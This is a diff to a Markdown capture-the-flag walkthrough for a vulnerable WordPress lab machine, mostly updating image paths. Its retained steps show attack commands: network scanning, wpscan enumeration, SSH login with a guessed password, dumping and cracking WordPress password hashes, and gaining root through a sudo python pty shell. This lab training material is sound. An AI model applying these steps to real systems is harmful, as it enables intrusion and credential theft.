@@ -8,7 +8,7 @@ To start, your team needs to confirm that newly created alerts are working. Once
 
 You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.
 
->##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other techniques have been explored. Look at the PowerPoint presentation and the Penetration Testing Report Target 1 to find more methods not specified in this walkthrough.
+>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other techniques have been explored. Look at the end of this walkthrough (Grep) or the PowerPoint presentation (LFI) to find different approaches.
 
 ---
 
@@ -34,19 +34,19 @@ Tools:
 
         ifconfig
 
-    ![1](/Images/2/1.PNG)
+    ![1](/Resources/Images/2/1.PNG)
 
 2. Network FootPrinting (find machines on the network).
 
         nmap 192.168.1.0/24
 
-    ![2](/Images/2/2.PNG)
+    ![2](/Resources/Images/2/2.PNG)
 
 3. Target1 fingerprinting (find services and ports on target1). 
 
         nmap -sV 192.168.1.110
 
-    ![3](/Images/2/3.png)
+    ![3](/Resources/Images/2/3.png)
 
 4. Enumerate with wpscan.
 
@@ -54,7 +54,7 @@ Tools:
 
     **Likewise, the usernames are easy to guess because of the leads on the website.**
 
-    ![4](/Images/2/4.PNG)
+    ![4](/Resources/Images/2/4.PNG)
 
 5. Find the flag inside the code with the google developers tool.
 
@@ -64,7 +64,7 @@ Tools:
 
     **flag1**
 
-    ![5](/Images/2/5.png)
+    ![5](/Resources/Images/2/5.png)
 
 6. Access Target1 through SSH from the Kali Linux Terminal.
 
@@ -74,7 +74,7 @@ Tools:
 
     Password: `michael`
 
-    ![6](/Images/2/6.png)
+    ![6](/Resources/Images/2/6.png)
 
 8. Look for flags.
 
@@ -84,7 +84,7 @@ Tools:
 
         find  -iname “*flag*” 2>/dev/null
 
-    ![7](/Images/2/7.png)
+    ![7](/Resources/Images/2/7.png)
 
 9. Open the file.
 
@@ -92,7 +92,7 @@ Tools:
 
     **flag2**
 
-    ![8](/Images/2/8.png)
+    ![8](/Resources/Images/2/8.png)
 
 10. Explore the WordPress directory.
 
@@ -102,9 +102,9 @@ Tools:
 
         Nano wp-config.php
 
-    ![9](/Images/2/9.png)
+    ![9](/Resources/Images/2/9.png)
 
-12. Login into MySQL with root user.
+12. Login into MySQL with the root user.
           
         mysql -u root -p
 
@@ -114,25 +114,25 @@ Tools:
 
         show databases;
 
-    ![10](/Images/2/10.png)
+    ![10](/Resources/Images/2/10.png)
 
 14. Use the WordPress database.
 
         use wordpress;
 
-    ![11](/Images/2/11.png)
+    ![11](/Resources/Images/2/11.png)
 
 15. Glance tables of the WordPress database.
 
         show tables;
 
-    ![12](/Images/2/12.png)
+    ![12](/Resources/Images/2/12.png)
 
 16. SQL query to glance at the wp_user table.
 
         SELECT * FROM wp_users;
 
-    ![13](/Images/2/13.png)
+    ![13](/Resources/Images/2/13.png)
 
 17. Prepare the Hashes to crack them.
 
@@ -148,7 +148,7 @@ Tools:
 
         ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**
 
-        ![14](/Images/2/14.png)
+        ![14](/Resources/Images/2/14.png)
 
 18. Crack the hashes with John the Ripper.
 
@@ -160,7 +160,7 @@ Tools:
 
         john –show hashes.txt
 
-    ![15](/Images/2/15.png)
+    ![15](/Resources/Images/2/15.png)
 
 20. Privilege escalation. Change user to steven.
 
@@ -172,19 +172,19 @@ Tools:
 
         Sudo -l
 
-    ![16](/Images/2/16.png)
+    ![16](/Resources/Images/2/16.png)
 
 22. Use python script to use steven's python root privilege to gain root access.
 
         sudo python -c 'import pty;pty.spawn("/bin/bash")'  
 
-    ![17](/Images/2/17.png)
+    ![17](/Resources/Images/2/17.png)
 
 23. Search flags.
 
         find  -iname “*flag*” 2>/dev/null
 
-    ![18](/Images/2/18.png)
+    ![18](/Resources/Images/2/18.png)
 
 24. Open the file.
 
@@ -192,7 +192,7 @@ Tools:
 
     **flag4**
 
-    ![19](/Images/2/19.png)
+    ![19](/Resources/Images/2/19.png)
 
 25. Search flag3.
 
@@ -200,7 +200,7 @@ Tools:
 
         grep -r flag3 *
 
-    ![20](/Images/2/20.png)
+    ![20](/Resources/Images/2/20.png)
 
 26. Open the binary file with nano.
 
@@ -216,28 +216,15 @@ Tools:
 
     **flag3**
 
-    ![21](/Images/2/21.png)
+    ![21](/Resources/Images/2/21.png)
 
 ***
 
-# Alternative methods to access flag 3 and 4.
-
-## Binary File: **Flag 3**
-
-1. Needs to be Root
-2. In the directory:  /var/lib/mysql 
-
-    ```
-    grep -r flag3 *
-    nano lib_logfile0
-    ctrl w flag3
-    ```
-
-**Flag3**
-
-![12](/Images/1/12.png)
+# An alternative method to obtain flag3 and flag4.
 
 ## SQL database: **Flag 3 and 4**
+
+- SQL Queries
 
 ```
 mysql -u root -p
@@ -246,14 +233,11 @@ mysql> use wordpress;
 mysql> show tables;
 mysql> select * from wp_posts;
 ```
-
-  **Flag3 and Flag4**
+- **Flag3 and Flag4**
  
-![11](/Images/1/11.png)
+    ![11](/Resources/Images/2/22.png)
 
 
-> Others Exploits:
-CVE-2014-6271 Shellshock vulnerability. It is possible to gain shell access through Remote code execution.
 
 ***
 
